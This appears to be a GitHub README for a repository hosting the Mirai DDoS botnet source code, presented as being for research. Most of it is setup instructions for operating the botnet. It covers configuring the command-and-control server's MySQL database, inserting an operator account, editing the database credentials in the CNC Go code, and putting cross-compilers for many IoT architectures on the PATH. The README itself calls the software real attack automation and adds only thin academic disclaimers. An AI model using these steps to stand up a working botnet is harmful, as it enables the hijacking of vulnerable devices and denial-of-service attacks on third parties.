# Mirai BotNet
Mirai DDoS Attack Source Code for Research Development Purposes

Uploaded for research purposes and so we can develop secure env and such.


## Requirements
* gcc
* golang
* electric-fence
* mysql-server
* mysql-client

## Credits

[Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)

##Notice

Please don't play in your office and use controlled environment. Study responsibly.

This is real automation of hacking and attack.

Continue study to secure whatever.

## Architecture

### Configuring CNC

    apt-get install mysql-server mysql-client

CNC requires database to work. When you install database, go into it and run
following sql (scripts/db.sql)

This will create database for you. To add your user,

    INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');

Now, go into file [`cnc/main.go`](cnc/main.go)

Edit these values

    const DatabaseAddr string   = "127.0.0.1"
    const DatabaseUser string   = "root"
    const DatabasePass string   = "password"
    const DatabaseTable string  = "mirai"

To the information for the mysql server you just installed

#####Install Go

sudo add-apt-repository ppa:ubuntu-lxc/lxd-stable

sudo apt-get update

sudo apt-get install golang

####put this to ~/.bashrc after tools chain and golang is installed.

export PATH=$PATH:/etc/xcompile/armv4l/bin

export PATH=$PATH:/etc/xcompile/armv6l/bin

export PATH=$PATH:/etc/xcompile/i586/bin

export PATH=$PATH:/etc/xcompile/m68k/bin

export PATH=$PATH:/etc/xcompile/mips/bin

export PATH=$PATH:/etc/xcompile/mipsel/bin

export PATH=$PATH:/etc/xcompile/powerpc/bin

export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin

export PATH=$PATH:/etc/xcompile/sh4/bin

export PATH=$PATH:/etc/xcompile/sparc/bin

export PATH=$PATH:/usr/local/go/bin

export GOPATH=$HOME/Documents/go


![alt tag](https://github.com/tinwinaung/Mirai-Source-Code/raw/master/architecture.png)

## Disclaimer

This repository is for academic purposes, the use of this software is your
responsibility.
